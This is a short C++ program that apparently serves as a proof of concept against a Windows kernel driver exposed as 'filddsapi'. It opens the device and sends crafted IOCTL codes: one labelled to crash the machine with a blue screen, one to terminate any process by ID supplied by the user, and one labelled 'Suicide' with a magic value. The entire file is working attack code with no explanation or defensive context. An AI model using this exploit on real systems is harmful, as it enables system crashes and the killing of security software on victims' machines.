#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\filddsapi"

HANDLE hDevice;

struct DATA_0x80112053
{
    unsigned int pid;
    unsigned char padding[4];
    unsigned int status;
};

void BSOD_0x80112053()
{
    DWORD dwWrite;
    DeviceIoControl(hDevice, 0x80112053, NULL, 0, NULL, 0, &dwWrite, NULL);
}

void Suicide_0x8011206B()
{
    DWORD dwWrite;
    int data = 0xFD323AB2;
    DeviceIoControl(hDevice, 0x8011206B, &data, 4, &data, 4, &dwWrite, NULL);
}

void TerminateProcess_0x80112053()
{
    DWORD dwWrite;
    DATA_0x80112053 data;
    scanf_s("%d", &data.pid);
    DeviceIoControl(hDevice, 0x80112053, &data, sizeof(data), &data, sizeof(data), &dwWrite, NULL);
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %llx\n", GetLastError());
        system("pause");
        return 0;
    }

    // BSOD_0x80112053();
    // TerminateProcess_0x80112053();
				Suicide_0x8011206B();

    system("pause");
    return 0;
}
